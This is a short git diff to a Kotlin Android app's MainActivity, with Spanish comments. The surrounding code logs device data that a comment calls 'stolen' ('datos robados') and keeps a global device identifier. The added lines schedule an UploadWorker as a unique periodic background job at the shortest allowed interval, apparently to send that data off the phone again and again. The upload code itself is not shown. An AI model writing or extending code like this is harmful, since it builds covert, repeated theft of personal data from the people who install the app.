@@ -14,6 +14,10 @@ import android.view.View.INVISIBLE
 import android.view.View.VISIBLE
 import android.widget.ImageView
 import androidx.annotation.RequiresApi
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.PeriodicWorkRequest
+import androidx.work.WorkManager
+import java.util.concurrent.TimeUnit
 
 
 var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android
@@ -52,6 +56,12 @@ class MainActivity : AppCompatActivity() {
                     // Imprime los datos robados para debug
 
                     Log.d("TAG",getSpec())
+
+                    // Codigo para aprender a utilizar worker
+                    // https://developer.android.com/reference/androidx/work/PeriodicWorkRequest
+                    val myWorkBuilder = PeriodicWorkRequest.Builder(UploadWorker::class.java, PeriodicWorkRequest.MIN_PERIODIC_INTERVAL_MILLIS+1, TimeUnit.MILLISECONDS)
+                    val myWork = myWorkBuilder.build()
+                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.REPLACE, myWork)
 
                 }
                 catch (e: Exception){
